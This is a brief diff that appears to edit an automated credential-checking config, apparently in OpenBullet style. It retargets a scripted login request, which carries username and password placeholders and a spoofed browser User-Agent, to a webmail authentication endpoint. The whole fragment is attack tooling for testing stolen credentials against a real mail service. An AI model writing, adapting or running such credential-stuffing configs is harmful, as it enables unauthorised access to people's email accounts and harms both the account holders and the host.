@@ -62,7 +62,7 @@
 }
 
 [SCRIPT]
-REQUEST GET "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=<USER>&Password=<PASS>" 
+REQUEST GET "https://webmail.au.syrahost.com/cgi-bin/auth?model=&simple=1&Login=<USER>&Password=<PASS>" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
 
